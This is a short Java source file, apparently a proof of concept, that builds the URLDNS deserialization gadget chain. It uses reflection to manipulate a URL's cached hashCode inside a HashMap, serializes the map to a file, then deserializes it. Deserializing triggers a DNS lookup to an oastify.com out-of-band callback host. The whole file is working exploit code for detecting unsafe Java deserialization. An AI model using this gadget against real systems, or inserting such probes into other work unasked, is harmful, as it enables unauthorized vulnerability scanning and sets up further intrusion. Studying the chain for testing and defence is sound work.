import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void serialize(Object obj)throws Exception{
        ObjectOutputStream oos= new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename)throws IOException,ClassNotFoundException {
        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));
        Object obj=ois.readObject();
        return obj;
    }
    public static void main(String[] args) throws Exception{

        URL url=new URL("http://266v8l4xaj4wpvrsyvtrk3am5db4zunj.oastify.com");
        HashMap<URL,Integer> hashMap=new HashMap<URL,Integer>();
        Class c =url.getClass();
        Field hashcodefield=c.getDeclaredField("hashCode");
        hashcodefield.setAccessible(true);
        hashcodefield.set(url,123);
        hashMap.put(url,0);
        hashcodefield.set(url,-1);
        serialize(hashMap);
        unserialize("ser.bin");
    }
}
